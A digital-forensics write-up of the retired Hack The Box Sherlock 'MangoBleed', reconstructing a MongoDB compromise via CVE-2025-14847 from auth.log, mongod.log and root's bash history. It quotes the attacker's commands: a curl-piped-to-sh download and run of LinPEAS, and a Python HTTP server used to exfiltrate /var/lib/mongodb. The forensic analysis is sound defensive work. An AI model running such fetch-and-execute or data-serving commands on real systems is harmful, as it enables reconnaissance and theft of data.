---
sherlock: MangoBleed
domain: DFIR / Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [dfir, linux, mongodb, uac, cve-2025-14847, exfiltration]
---

# MangoBleed — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Investigation notes; no platform answers.

## Scenario

The host `mongodbsync` is a **secondary MongoDB** maintained once a month. The administrator has just heard about *MongoBleed* and hands over a **UAC triage acquisition** (`uac-mongodbsync-linux-triage.tar.gz`) to confirm compromise and reconstruct the activity.

## Evidence

```text
uac-mongodbsync-linux-triage/
├── bodyfile
├── hash_executables
├── [root]/var/log/mongod.log        (structured JSON)
├── [root]/var/log/auth.log
├── [root]/root/.bash_history
└── [live]/...
```

## Investigation

### 1. The vulnerability

MongoBleed is **CVE-2025-14847**: a memory disclosure in MongoDB's zlib handling of compressed network messages. It needs no authentication and leaks memory fragments (credentials included) to anyone who can reach the port. The affected version here is **8.0.16**, visible in `buildInfo`/startup lines of `mongod.log`.

```bash
grep -o '"msg":"[^"]*"' mongod.log | sort | uniq -c | sort -rn | head
grep -i buildInfo mongod.log | head
```

### 2. Initial access

`auth.log` keeps the `sshd` sessions for `mongoadmin`: two openings in quick succession from the same external IP, the second right before hands-on activity. That IP is the attacker origin and the compromised account is the admin one.

```bash
grep Accepted auth.log
last -f wtmp | head
```

### 3. Hands on keyboard

`root`'s `.bash_history` is the centrepiece: a download of **LinPEAS** from the PEASS-ng release, execution, then a `cd` into a specific directory followed by a Python web server to move data out.

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python3 -m http.server
```

The target directory is **`/var/lib/mongodb`**: the attacker packages the database and serves it over HTTP instead of using Mongo's own protocol.

## Findings

- Access: unauthenticated **CVE-2025-14847** against the exposed MongoDB.
- Escalation: the `mongoadmin` account already had enough privilege; LinPEAS just confirms the terrain.
- Exfiltration: a copy of `/var/lib/mongodb` served with `python3 -m http.server`.

## Lessons

- A memory-disclosure CVE is detected by version and anomalous port connections, not malware signatures.
- In UAC triage, `auth.log` plus `.bash_history` rebuild most of the chain.
- History mixes legitimate tooling (LinPEAS) with exfiltration: read all of it.
- Mitigation: patch MongoDB, keep the port off the Internet, alert on `python -m http.server` on servers.
